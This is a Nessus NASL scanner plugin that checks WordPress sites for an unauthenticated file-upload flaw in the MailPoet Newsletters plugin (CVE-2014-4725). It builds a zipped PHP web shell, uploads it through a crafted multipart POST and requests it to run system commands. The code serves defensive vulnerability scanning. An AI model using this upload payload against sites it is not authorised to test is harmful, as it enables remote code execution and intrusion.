#
# (C) Tenable Network Security, Inc.
#

if (!defined_func("nasl_level") || nasl_level() < 5200 ) exit(0, "Nessus is older than 5.2");

include("compat.inc");

if (description)
{
  script_id(76526);
  script_version("$Revision: 1.4 $");
  script_cvs_date("$Date: 2015/09/24 23:21:23 $");

  script_cve_id("CVE-2014-4725");
  script_bugtraq_id(68310);
  script_osvdb_id(108614);

  script_name(english:"MailPoet Newsletters for WordPress Arbitrary File Upload");
  script_summary(english:"Attempts to upload a file to execute arbitrary code.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows for arbitrary
file uploads.");
  script_set_attribute(attribute:"description", value:
"The MailPoet Newsletters plugin for WordPress installed on the remote
web server is affected by a file upload vulnerability due to a failure
to properly authenticate users. An unauthenticated, remote attacker
can exploit this issue to upload files with arbitrary code and then
execute them on the remote host, subject to the permissions of the web
server user id.");
  # http://blog.sucuri.net/2014/07/remote-file-upload-vulnerability-on-mailpoet-wysija-newsletters.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?47378aa3");
  script_set_attribute(attribute:"solution", value:"Upgrade to MailPoet Newsletters version 2.6.7 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"WordPress MailPoet Newsletters File Upload");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/07/01");
  script_set_attribute(attribute:"patch_publication_date", value:"2014/07/01");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/07/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2015 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("ssh1_func.inc");
include("zip.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
install_url = build_url(port:port, qs:dir);

plugin = "MailPoet Newsletters";

# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);

if (!installed)
{
  checks = make_array();
  path = "/wp-content/plugins/";
  checks[path + "wysija-newsletters/readme.txt"][0] =
    make_list('MailPoet Newsletters');

  # Ensure plugin is installed
  installed = check_webapp_ext(
    checks : checks,
    dir    : dir,
    port   : port,
    ext    : plugin
  );
}
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

base = "nessus_" + unixtime();
zip_file_name = base + ".zip";
php_file_name = base + ".php";
folder_name = base;
bound = "_bound_nessus_" + unixtime();

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask";

vuln = FALSE;

foreach cmd (cmds)
{
  # Get path to the file uploaded for use in our reporting section
  if (cmd == 'id') upload_path = "system('pwd')";
  else upload_path = "system('dir "+ php_file_name +"')";

  # Form  our PHP file to upload
  file_contents = "<?php echo('<pre>'); system('" + cmd + "');" + upload_path + ";?>";
  files = make_list2(
    make_array("name", folder_name + "/" + php_file_name, "contents", file_contents),
    make_array("name", folder_name + "/" + "style.css", "contents", "")
  );
  zipfile = create_zip(files);

  post_data =
    '--' + bound + '\r\n' +
    'Content-Disposition: form-data; name="my-theme"; filename="' + zip_file_name + '"\r\n' +
    'Content-Type: application/x-zip-compressed\r\n' +
    'Content-Transfer-Encoding: binary\r\n' +
    '\r\n' +
    zipfile + '\r\n' +
    '--' + bound + '\r\n' +
    'Content-Disposition: form-data; name="overwriteexistingtheme"\r\n' +
    '\r\n' +
    'on\r\n' +
    '--' + bound + '\r\n' +
    'Content-Disposition: form-data; name="action"\r\n' +
    '\r\n' +
    'themeupload\r\n' +
    '--' + bound + '\r\n' +
    'Content-Disposition: form-data; name="submitter"\r\n' +
    '\r\n' +
    'Upload\r\n' +
    '--' + bound + '--';

  url = "/wp-admin/admin-post.php?page=wysija_campaigns&action=themes";

 #Attempt upload
  res2 = http_send_recv3(
    method    : "POST",
    item      : dir + url,
    data      : post_data,
    add_headers:
      make_array("Content-Type",
                 "multipart/form-data; boundary=" + bound),
    port         : port,
    exit_on_fail : TRUE
  );
  exp_request = http_last_sent_request();

  # Try accessing the file we created
  upload_loc = "/wp-content/uploads/wysija/themes/";
  verify_path = upload_loc + folder_name + "/" + php_file_name;
  res2 = http_send_recv3(
    method       : "GET",
    item         : dir + verify_path,
    port         : port,
    exit_on_fail : TRUE
  );
  output = res2[2];

  if (egrep(pattern:cmd_pats[cmd], string:output))
  {
    vuln = TRUE;
    get_up_path = "" + folder_name;

    # Extract path for reporting
    if (cmd == 'id')
    {
      get_path = strstr(output, "/");
      get_up_path = chomp(get_path) + "/";
      if (!isnull(strstr(output, "uid")))
        output = strstr(output, "uid") - get_path;
    }
    else
    {
      get_path = strstr(output, "Volume in drive");
      if (!isnull(strstr(output, "Windows IP")))
        output = strstr(output, "Windows IP") - get_path;
      get_dir = egrep(pattern:"Directory of (.+)", string:get_path);
      if(!isnull(get_dir))
         get_up_path = chomp((get_dir - " Directory of ")) + '\\';
    }
    break;
  }
}

if (!vuln)
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");

if (report_verbosity > 0)
{
  snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);

  report =
    '\n' + 'Nessus was able to verify the issue exists using the following request :' +
     '\n' +
     '\n' + install_url + verify_path +
     '\n' +
     '\n' + 'Note that this folder has not been removed by Nessus, and will need to be' +
     '\n' + 'manually deleted (' + get_up_path + ').' +
     '\n';
  if (report_verbosity > 1)
  {
    report +=
      '\n' + 'This file was uploaded using an unauthenticated POST request to : ' +
      '\n' + install_url + url +
      '\n' +
      '\n' + 'The file uploaded by Nessus executed the command "'+cmd+ '"' +
      '\n' + 'which produced the following output :' +
      '\n' +
      '\n' + snip +
      '\n' + chomp(output) +
      '\n' + snip +
      '\n';
  }
  security_hole(port:port, extra:report);
}
else security_hole(port);
